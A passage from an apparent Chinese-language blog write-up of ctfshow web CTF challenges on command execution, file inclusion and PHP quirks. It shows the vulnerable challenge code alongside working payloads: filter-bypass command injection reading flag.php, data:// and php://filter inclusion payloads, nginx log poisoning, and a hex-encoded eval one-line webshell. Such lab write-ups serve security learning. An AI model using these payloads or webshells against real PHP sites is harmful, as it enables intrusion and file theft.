进程实例嵌套深度的累加器,进程第一次打开shell时&#96;$&#123;SHLVL&#125;&#x3D;1&#96;，然后在此shell中再打开一个shell时&#96;$&#123;SHLVL&#125;&#x3D;2&#96;。&#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;就输出&#96;&#x2F;</code></pre><pre class="language-none"><code class="language-none">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1&#96;&#96;$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5</code></pre><h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>禁用了<code>$&#123;PATH</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430232002769.png" alt="image-20220430232002769"></p><pre class="language-none"><code class="language-none">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;$&#123;SHLVL&#125;       &#x2F;&#x2F;一般是一个个位数$&#123;#SHLVL&#125;     &#x2F;&#x2F;1，表示结果的字符长度$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;表示&#x2F;$&#123;USER&#125;        &#x2F;&#x2F;www-data$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at&#x2F;bin&#x2F;cat flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</code></pre><h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</code></pre><p>或者</p><pre class="language-none"><code class="language-none">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre><h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>相比上一题，多过滤了一个SHLVL，那就用#?代替</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre><p>相当于</p><p>/bin/bash64 flag.php</p><p>或者</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???&#x2F;bin&#x2F;rev</code></pre><h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|#|%|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>payload</p><blockquote><p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p></blockquote><pre class="language-none"><code class="language-none">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#可能存在成功的机会，不断刷新*</code></pre><h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: 收集自网络# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母<br>题中可用的进制转换函数：<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p><pre class="language-none"><code class="language-none">$_GET[abs]($_GET[acos])&#x2F;&#x2F;strlen($content) &gt;&#x3D; 80，有长度限制，所以利用get命令执行↓$_GET&#123;abs&#125;($_GET&#123;acos&#125;)&#x2F;&#x2F;[]在黑名单，用&#123;&#125;代替↓$pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)↓进制转换base_convert(number,frombase,tobase)：在任意进制之间转换数字dechex()：把十进制数转换为十六进制数hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符最重要的是hex2bin函数，但是不在白名单里面base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get）base_convert(&#39;hex2bin&#39;,36,10)→37907361743_GET→  hex十六进制 5f474554 (不能有字母所以十六进制不行) →  dec十进制 1598506324(在线转换)所以_GET可以写为hex2bin(dechex(1598506324))↓base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))最后的payload?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat *</code></pre><p>payload1：</p><pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 添加头部信息：1&#x3D;tac flag.php</code></pre><p>payload2：</p><pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>题目：</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>将php替换成了???,考虑使用data协议进行base64解码。<br><strong>payload</strong></p><pre class="language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</code></pre><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>题目：</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>data也禁用了，尝试日志注入攻击。<br>日志的位置，/var/log/nginx/access.log。<br>在user-agent的位置，首先<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>，列出来文件。<br>之后读目标文件，<code>&lt;?php system(&#39;cat fl0g.php&#39;); ?&gt;</code></p><p>还可以直接写马</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>题目：</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;</code></pre><p>过滤了php、data、:，尝试上题方法，<br>同上题</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p><p>利用php://filter的编码来使结束的代码失效</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>data协议</p><p>data://text/plain;base64,poc</p><pre class="language-php" data-language="php"><code class="language-php">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwqJyk7</code></pre><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>还是利用php://filter的编码来使结束的代码失效</p><p>**convert.iconv.**这个过滤器还是用的。</p><p>ucs-2 和ucs-4都能用。</p><p>ucs-2 二位一反转，字符个数要在偶数位上，ucs-4 四位一反转，字符个数要是4的倍数。位数好控制，参数改改长度就行了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200136309.png" alt="image-20220505200136309"></p><pre class="language-php" data-language="php"><code class="language-php"> file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200318190.png" alt="image-20220505200318190"></p><h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>数组绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200639134.png" alt="image-20220505200639134"></p><p>intval()–非空的数组会返回1，可以采用数组绕过intval()函数</p><p><strong>preg_match()</strong></p><p>返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索，<strong>该函数只会匹配一行，可以%0a换行绕过</strong></p><p>preg_match_all()不同于此，它会一直搜索 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200839032.png" alt="image-20220505200839032"></p><p>加个大于号，或者转成八进制，十六进制</p><p>intval支持不同进制，这里base指定是0，那么intval会根据我们输入情况使用进制</p><p>intval取的是我们所输入内容开头的整数，也就是说我们传入含有字符的字符串，例如?num=4476a,那么intval(“4476a”)也等于4476</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><blockquote><p>/m 表示多行匹配，匹配换行符两端的潜在匹配。影响正则中的^$符号</p></blockquote><p>多行匹配可以通过%0a（回车键）绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505201235224.png" alt="image-20220505201235224"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;</code></pre><p>进制转换或者用e来当作科学计数法</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>过滤了字母，用八进制</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>strpos($num, “0”)</p><p>strpos()函数的理解：该函数是从我们传入的参数num中，寻找并匹配数字0，第一位匹配正确返回0，第二位匹配正确返回1，以后递推，所以在题中即为只要匹配到，输出就为true，取反就为false.所以可以通过除了第一位其他位出现0的方法让if条件为假。<strong>该函数并不是只匹配一行数据。回车后匹配仍有效。</strong>可以通过?num=%0a4476绕过</p><p>只要0不在第一位就行（但是必须有，所以可以用八进制带加号+010574，或者放在小数点上</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202027037.png" alt="image-20220505202027037"></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;</code></pre><p>第一个if是弱比较，只能进制转换</p><p>后边的strpos可以需要在转换了进制的数字前加点不影响大小的东西比如回车换行空格加号</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202339569.png" alt="image-20220505202339569"></p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203100601.png" alt="image-20220505203100601"></p><p>相对路径绕过</p><p>或者伪协议</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203319823.png" alt="image-20220505203319823"></p><p>md5函数不能处理数组，会返回null</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a></p><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);#本php文档包含了一个flag.php文件，是我们想要的flag$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;#$_GET存在，则_GET&#x3D;&amp;$_POST否则$_GET值为&#39;flag‘$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;#中间两行代码看起来貌似没用$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);#如果get传参了HTTP_FLAG&#x3D;flag，就highlight_file($flag)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505204205363.png" alt="image-20220505204205363"></p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$allow &#x3D; array();for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;</code></pre><p>in_array()<br>in_array(search,array,type)</p><p>search—必须，规定在数组中搜索的值</p><p>array—必需，规定搜索的数组</p><p>type—可选，如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</p><p>如果设置了第三个参数，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。</p><p>而题中没有设置，这里可以默认没有设置，即只是弱类型匹配</p><p>利用了in_array的弱类型比较，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205056630.png" alt="image-20220505205056630"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205136351.png" alt="image-20220505205136351"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;    &#125;</code></pre><p>这里要看运算优先级</p><p>逻辑运算符&gt;逻辑运算（赋值）&gt;and、or</p><p>v0的取值只和v1有关。v1参数为数字，没有其他限制，但是v2不能有；标志，v3必须有；</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205701221.png" alt="image-20220505205701221"></p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210313073.png" alt="image-20220505210313073"></p><p>利用反射类读</p><h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><p><strong>call_user_func()</strong></p><p>把第一个参数作为回调参数调用</p><p>本题中要求v2是数字，然后通过substr函数截取v2的第三位开始的数据，及以后的数据。v1、v3题中没有限制，</p><p><strong>is_numerc()</strong></p><p>该函数在php5版本下有漏洞，可以识别十六进制，所以可以将一句话木马写作十六进制的格式</p><p>故构造<code>v2=(&lt;?php eval($_REQUEST[a]);?&gt;)</code></p><p>v2=3c3f706870206576616c28245f524551554553545b615d293b3f3e</p><p>v1可以利用hex2bin()函数来进行把十六进制字符转换成ASCII字符，即我们想要的一句话木马。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210803363.png" alt="image-20220505210803363"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">get:v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.phppost:v1&#x3D;hex2bin</code></pre><p>web103过滤了php但是这里的v2用的是短标签</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;        echo $flag;    &#125;&#125;</code></pre><p>可以用数组绕过，也可以找个前几位数字一样的</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505212724685.png" alt="image-20220505212724685"></p><p>变量覆盖，get suces=flag后</p><p>$suces=$flag</p><p>post error=suces后</p><p>$error=$suces</p><p>也就是$error=$flag，在经过if判断的时候通过die函数就会显示flag</p><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505213442076.png" alt="image-20220505213442076"></p><p>跟104差不多</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214133528.png" alt="image-20220505214133528"></p><p>整点空数组绕过(虽然上边这个有点问题，但是过了就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214920530.png" alt="image-20220505214920530"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214149572.png" alt="image-20220505214149572"></p><p>还有其他的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214423673.png" alt="image-20220505214423673"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214535301.png" alt="image-20220505214535301"></p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;    die(&#39;error&#39;);&#125;&#x2F;&#x2F;只有36d的人才能看到flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;    echo $flag;&#125;</code></pre><p><strong>ereg()</strong></p><p>正则匹配的一种，存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配</p><p><strong>strrev()</strong></p><p>字符串逆序，0x36d十进制为877，逆序即为778</p><p>故可以构建payload</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505215746759.png" alt="image-20220505215746759"></p><p>当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过<code>echo</code>显示<br>即使传入了空的括号，代码依旧可以运行，且<code>error_reporting(0)</code>的存在阻止了报错</p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;</code></pre><p>利用原生类FilesystemIterator配合getcwd来读文件目录，然后直接访问就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180313118.png" alt="image-20220506180313118"></p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; 